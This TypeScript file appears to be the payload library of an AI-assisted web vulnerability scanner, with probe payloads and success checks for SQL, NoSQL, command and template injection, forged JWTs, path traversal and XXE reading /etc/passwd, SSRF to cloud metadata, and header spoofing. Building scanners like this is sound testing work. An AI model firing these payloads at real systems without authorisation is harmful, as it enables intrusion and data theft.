/**
 * Static payload library modelled on the PortSwigger Web Security Academy curriculum.
 *
 * The LLM maps endpoints → vuln classes (judgment).
 * This library maps vuln classes → payloads + vuln_condition (deterministic).
 *
 * Payloads can be parameterised with the endpoint's actual body_fields and query_params
 * so injection attacks target the right field names rather than guessing.
 */

export interface PayloadSpec {
  headers?: Record<string, string>;
  body?: string;
  query?: string;
  /** 'none' = no auth, 'bearer' = user_a token, 'user_b' = second test account token */
  auth?: 'none' | 'bearer' | 'user_b';
}

export interface VulnClassConfig {
  /**
   * Static array OR a factory function that receives the endpoint's known body fields
   * and query param names to produce context-aware payloads.
   */
  payloads: PayloadSpec[] | ((bodyFields: string[], queryParams: string[]) => PayloadSpec[]);
  /**
   * JS expression evaluated with (status: number, body: string, responseHeaders: Record<string, string>).
   * Must be a single expression — no statements, no semicolons.
   */
  vuln_condition: string;
}

const JSON_HDR = { 'Content-Type': 'application/json' };

// ─── Helpers ──────────────────────────────────────────────────────────────────

function injectBody(fields: string[], payloads: Record<string, unknown>[]): PayloadSpec[] {
  // For each payload object, build one spec per target field
  return payloads.map((payload) => ({
    body: JSON.stringify(payload),
    headers: JSON_HDR,
    auth: 'bearer' as const,
  }));
}

function injectBodyForField(field: string, values: unknown[]): PayloadSpec[] {
  return values.map((v) => ({
    body: JSON.stringify({ [field]: v }),
    headers: JSON_HDR,
    auth: 'bearer' as const,
  }));
}

function baselineValue(field: string): string {
  const f = field.toLowerCase();
  if (f.includes('email')) return 'scanner.test@example.com';
  if (f.includes('password') || f === 'pass' || f === 'pwd') return 'Password123!';
  if (f.includes('username') || f === 'user' || f.includes('login') || f.includes('handle')) return 'scanner_user';
  if (f === 'name' || f.includes('full_name')) return 'Scanner User';
  if (f.includes('phone')) return '5551234567';
  if (f.includes('url') || f.includes('uri') || f.includes('link') || f.includes('webhook')) return 'https://example.com';
  return 'test';
}

function buildBaselineBody(fields: string[]): Record<string, unknown> {
  const base: Record<string, unknown> = {};
  for (const field of fields) base[field] = baselineValue(field);
  return base;
}

// ─── Library ──────────────────────────────────────────────────────────────────

export const PAYLOAD_LIBRARY: Record<string, VulnClassConfig> = {

  // ── SQL Injection (PortSwigger: SQL Injection → classic, UNION, error-based, blind) ──
  sql_injection: {
    payloads: (bodyFields, queryParams) => {
      const qp = queryParams[0] ?? 'id';
      const bf = bodyFields[0] ?? 'id';
      const base = buildBaselineBody(bodyFields);
      return [
        { query: `?${qp}=1'+OR+'1'='1'--`, auth: 'bearer' },
        { query: `?${qp}=1'+UNION+SELECT+NULL,NULL--`, auth: 'bearer' },
        { query: `?${qp}=1';+SELECT+SLEEP(3)--`, auth: 'bearer' },
        { body: JSON.stringify({ ...base, [bf]: "1 OR 1=1--" }), headers: JSON_HDR, auth: 'bearer' },
        { body: JSON.stringify({ ...base, [bf]: "' OR 'x'='x" }), headers: JSON_HDR, auth: 'bearer' },
        { body: JSON.stringify({ ...base, [bf]: "1; SELECT SLEEP(3)--" }), headers: JSON_HDR, auth: 'none' },
      ];
    },
    vuln_condition: `status === 200 && (body.includes("syntax error") || body.includes("ORA-") || body.includes("mysql_fetch") || body.includes("UNION") || body.includes("pg_catalog"))`,
  },

  // ── NoSQL Injection (PortSwigger: NoSQL Injection) ────────────────────────
  nosql_injection: {
    payloads: (bodyFields, queryParams) => {
      const f0 = bodyFields[0] ?? 'username';
      const f1 = bodyFields[1] ?? 'password';
      const qp = queryParams[0] ?? f0;
      const base = buildBaselineBody(bodyFields);
      return [
        { body: JSON.stringify({ ...base, [f0]: { '$gt': '' }, [f1]: { '$gt': '' } }), headers: JSON_HDR, auth: 'none' },
        { body: JSON.stringify({ ...base, [f0]: { '$ne': null }, [f1]: { '$ne': null } }), headers: JSON_HDR, auth: 'none' },
        { body: JSON.stringify({ ...base, [f0]: "admin'||'1'=='1" }), headers: JSON_HDR, auth: 'none' },
        { query: `?${qp}[$ne]=x`, auth: 'none' },
      ];
    },
    vuln_condition: `status === 200 && (body.includes("token") || body.includes("userId") || body.includes("admin") || body.includes('"id"'))`,
  },

  // ── Auth Bypass (PortSwigger: Authentication → logic flaws, bypass) ────────
  auth_bypass: {
    payloads: (bodyFields) => {
      const f0 = bodyFields[0] ?? 'username';
      const f1 = bodyFields[1] ?? 'password';
      const base = buildBaselineBody(bodyFields);
      return [
        { auth: 'none' },
        { headers: { 'Authorization': 'Bearer null' }, auth: 'none' },
        { headers: { 'Authorization': 'Bearer undefined' }, auth: 'none' },
        { headers: { 'Authorization': 'Bearer 0' }, auth: 'none' },
        { body: JSON.stringify({ ...base, [f0]: "administrator'--", [f1]: 'anything' }), headers: JSON_HDR, auth: 'none' },
      ];
    },
    vuln_condition: `status === 200`,
  },

  // ── JWT Attacks (PortSwigger: JWT Attacks → none algorithm, weak secret) ───
  jwt_attack: {
    payloads: [
      // alg:none — unsigned token claiming userId=1 role=admin
      {
        headers: { 'Authorization': 'Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjEsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0.' },
        auth: 'none',
      },
      // HS256 signed with empty string secret
      {
        headers: { 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0.3oeYTDCs7D2MVzLVEH0F3VFNL7X0h-R9BePCj9MNRWQ' },
        auth: 'none',
      },
      // HS256 signed with "secret"
      {
        headers: { 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ' },
        auth: 'none',
      },
    ],
    vuln_condition: `status === 200 && !body.toLowerCase().includes("invalid") && !body.toLowerCase().includes("unauthorized")`,
  },

  // ── IDOR (PortSwigger: Access Control → Horizontal Privilege Escalation) ───
  idor: {
    payloads: [
      // user_b accesses endpoint originally fetched as user_a
      { auth: 'user_b' },
      // Direct object ID guessing
      { query: '?userId=1', auth: 'bearer' },
      { query: '?userId=0', auth: 'bearer' },
      { query: '?user_id=1', auth: 'bearer' },
    ],
    vuln_condition: `status === 200`,
  },

  // ── Vertical Privilege Escalation (PortSwigger: Access Control → Vertical) ─
  vertical_privilege_escalation: {
    payloads: [
      { auth: 'none' },
      { headers: { 'X-Original-URL': '/admin' }, auth: 'bearer' },
      { headers: { 'X-Rewrite-URL': '/admin' }, auth: 'bearer' },
      { headers: { 'X-Custom-IP-Authorization': '127.0.0.1' }, auth: 'none' },
      { query: '?role=admin&isAdmin=true', auth: 'bearer' },
      { query: '?admin=true', auth: 'bearer' },
    ],
    vuln_condition: `status === 200`,
  },

  // ── Mass Assignment (PortSwigger: API Testing → Mass Assignment) ───────────
  mass_assignment: {
    payloads: (bodyFields) => {
      const base = buildBaselineBody(bodyFields);
      return [
        { body: JSON.stringify({ ...base, role: 'admin', isAdmin: true, is_admin: true, admin: true }), headers: JSON_HDR, auth: 'bearer' },
        { body: JSON.stringify({ ...base, price: 0, discount: 100 }), headers: JSON_HDR, auth: 'bearer' },
        { body: JSON.stringify({ ...base, balance: 999999 }), headers: JSON_HDR, auth: 'bearer' },
        { body: JSON.stringify({ ...base, verified: true, emailVerified: true }), headers: JSON_HDR, auth: 'bearer' },
      ];
    },
    vuln_condition: `status < 400`,
  },

  // ── Server-Side Parameter Pollution (PortSwigger: API Testing → SSPP) ──────
  server_side_parameter_pollution: {
    payloads: (_, queryParams) => {
      const qp = queryParams[0] ?? 'field';
      return [
        { query: `?${qp}=legitimate&${qp}=injected`, auth: 'bearer' },
        { query: `?username=user%26role=admin`, auth: 'bearer' },
        { query: `?${qp}=test%23injected`, auth: 'bearer' },
      ];
    },
    vuln_condition: `status < 400`,
  },

  // ── Path Traversal (PortSwigger: Path Traversal) ──────────────────────────
  path_traversal: {
    payloads: (_, queryParams) => {
      const qp = queryParams[0] ?? 'file';
      return [
        { query: `?${qp}=../../../etc/passwd`, auth: 'bearer' },
        { query: `?${qp}=..%2F..%2F..%2Fetc%2Fpasswd`, auth: 'bearer' },
        { query: `?${qp}=....//....//etc/passwd`, auth: 'bearer' },
        { query: `?${qp}=..%252F..%252Fetc%252Fpasswd`, auth: 'bearer' },
        { query: `?${qp}=/etc/passwd`, auth: 'bearer' },
      ];
    },
    vuln_condition: `body.includes("root:x:") || body.includes("/bin/bash") || body.includes("/bin/sh")`,
  },

  // ── Command Injection (PortSwigger: OS Command Injection) ─────────────────
  command_injection: {
    payloads: (bodyFields, queryParams) => {
      const bf = bodyFields[0] ?? 'host';
      const qp = queryParams[0] ?? 'cmd';
      const base = buildBaselineBody(bodyFields);
      return [
        { body: JSON.stringify({ ...base, [bf]: 'localhost; id' }), headers: JSON_HDR, auth: 'bearer' },
        { body: JSON.stringify({ ...base, [bf]: 'localhost | whoami' }), headers: JSON_HDR, auth: 'bearer' },
        { body: JSON.stringify({ ...base, [bf]: '127.0.0.1`id`' }), headers: JSON_HDR, auth: 'bearer' },
        { body: JSON.stringify({ ...base, [bf]: 'localhost;sleep 3' }), headers: JSON_HDR, auth: 'bearer' },
        { query: `?${qp}=whoami`, auth: 'bearer' },
      ];
    },
    vuln_condition: `body.includes("root") || body.includes("www-data") || body.includes("nobody") || body.includes("uid=")`,
  },

  // ── SSTI (PortSwigger: Server-Side Template Injection) ─────────────────────
  ssti: {
    payloads: (bodyFields, queryParams) => {
      const bf = bodyFields[0] ?? 'name';
      const qp = queryParams[0] ?? 'template';
      const base = buildBaselineBody(bodyFields);
      return [
        { body: JSON.stringify({ ...base, [bf]: '{{7*7}}' }), headers: JSON_HDR, auth: 'bearer' },
        { body: JSON.stringify({ ...base, [bf]: '${7*7}' }), headers: JSON_HDR, auth: 'bearer' },
        { body: JSON.stringify({ ...base, [bf]: '<%= 7*7 %>' }), headers: JSON_HDR, auth: 'bearer' },
        { body: JSON.stringify({ ...base, [bf]: '#{7*7}' }), headers: JSON_HDR, auth: 'bearer' },
        { query: `?${qp}={{7*7}}`, auth: 'bearer' },
        { query: `?${qp}=%7B%7B7*7%7D%7D`, auth: 'bearer' },
      ];
    },
    vuln_condition: `body.includes("49") && !body.includes("{{7*7}}") && !body.includes("\\${7*7}")`,
  },

  // ── SSRF (PortSwigger: SSRF → basic, filter bypass, blind) ───────────────
  ssrf: {
    payloads: (bodyFields, queryParams) => {
      const bf = bodyFields.find((f) => /url|uri|link|src|href|redirect|callback|webhook/i.test(f)) ?? bodyFields[0] ?? 'url';
      const base = buildBaselineBody(bodyFields);
      return [
        { body: JSON.stringify({ ...base, [bf]: 'http://169.254.169.254/latest/meta-data/' }), headers: JSON_HDR, auth: 'bearer' },
        { body: JSON.stringify({ ...base, [bf]: 'http://localhost:22' }), headers: JSON_HDR, auth: 'bearer' },
        { body: JSON.stringify({ ...base, [bf]: 'http://127.0.0.1:80' }), headers: JSON_HDR, auth: 'bearer' },
        { body: JSON.stringify({ ...base, [bf]: 'http://[::1]/admin' }), headers: JSON_HDR, auth: 'bearer' },
        { body: JSON.stringify({ ...base, [bf]: 'http://169.254.169.254@evil.com/' }), headers: JSON_HDR, auth: 'bearer' },
      ];
    },
    vuln_condition: `status === 200 && (body.includes("ami-id") || body.includes("SSH") || body.includes("meta-data") || body.length > 500)`,
  },

  // ── XXE (PortSwigger: XXE Injection) ────────────────────────────────────
  xxe: {
    payloads: [
      {
        body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        headers: { 'Content-Type': 'application/xml' },
        auth: 'bearer',
      },
      {
        body: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/hostname">]><root>&test;</root>',
        headers: { 'Content-Type': 'application/xml' },
        auth: 'bearer',
      },
      {
        body: '{"data": "<?xml version=\\"1.0\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">]><foo>&xxe;</foo>"}',
        headers: JSON_HDR,
        auth: 'bearer',
      },
    ],
    vuln_condition: `body.includes("root:x:") || body.includes("/bin/bash") || body.includes("DOCTYPE")`,
  },

  // ── CORS Misconfiguration (PortSwigger: CORS) ────────────────────────────
  cors_misconfiguration: {
    payloads: [
      { headers: { 'Origin': 'https://evil.com' }, auth: 'bearer' },
      { headers: { 'Origin': 'null' }, auth: 'bearer' },
      { headers: { 'Origin': 'https://evil.com' }, auth: 'none' },
    ],
    // responseHeaders is available as a third parameter
    vuln_condition: `responseHeaders['access-control-allow-origin'] === 'https://evil.com' || responseHeaders['access-control-allow-origin'] === 'null' || (responseHeaders['access-control-allow-credentials'] === 'true' && responseHeaders['access-control-allow-origin'] !== undefined)`,
  },

  // ── CSRF (PortSwigger: CSRF) ─────────────────────────────────────────────
  csrf: {
    payloads: (bodyFields) => {
      const body = bodyFields.length > 0
        ? JSON.stringify(Object.fromEntries(bodyFields.map((f) => [f, 'test'])))
        : '{}';
      return [
        { body, headers: { ...JSON_HDR, 'Origin': 'https://evil.com' }, auth: 'bearer' },
        { body, headers: { ...JSON_HDR, 'Referer': 'https://evil.com' }, auth: 'bearer' },
      ];
    },
    vuln_condition: `status < 400`,
  },

  // ── Rate Limiting (PortSwigger: Authentication → brute-force protection) ──
  rate_limiting: {
    // 20 identical requests — if none returns 429, rate limiting is absent
    payloads: Array.from({ length: 20 }, () => ({ auth: 'none' as const })),
    vuln_condition: `status !== 429`,
  },

  // ── Information Disclosure (PortSwigger: Information Disclosure) ──────────
  information_disclosure: {
    payloads: [
      { headers: { 'X-Debug': 'true', 'X-Debug-Token': '1' }, auth: 'bearer' },
      { query: '?debug=true&trace=1&XDEBUG_SESSION=1', auth: 'bearer' },
      { headers: { 'X-Forwarded-For': '127.0.0.1', 'X-Real-IP': '127.0.0.1' }, auth: 'none' },
      { headers: { 'Accept': 'application/json' }, auth: 'none' },
    ],
    vuln_condition: `(body.toLowerCase().includes("stack") && body.toLowerCase().includes("at ")) || body.includes("Exception") || body.toLowerCase().includes("password") || body.includes("secret")`,
  },

  // ── HTTP Host Header (PortSwigger: HTTP Host Header Attacks) ─────────────
  http_host_header: {
    payloads: [
      { headers: { 'Host': 'attacker.com' }, auth: 'bearer' },
      { headers: { 'Host': 'localhost' }, auth: 'none' },
      { headers: { 'X-Forwarded-Host': 'attacker.com' }, auth: 'bearer' },
      { headers: { 'X-Host': 'attacker.com' }, auth: 'bearer' },
    ],
    vuln_condition: `body.includes("attacker.com") || (status === 200 && body.length > 0)`,
  },

};

// ─── Utility ──────────────────────────────────────────────────────────────────

/** Resolve the payload array for a vuln class, applying body/query field context. */
export function resolvePayloads(
  config: VulnClassConfig,
  bodyFields: string[],
  queryParams: string[],
): PayloadSpec[] {
  if (typeof config.payloads === 'function') {
    return config.payloads(bodyFields, queryParams);
  }
  return config.payloads;
}

/** All supported vuln_class keys — used in the LLM prompt. */
export const SUPPORTED_VULN_CLASSES = Object.keys(PAYLOAD_LIBRARY).join(' | ');
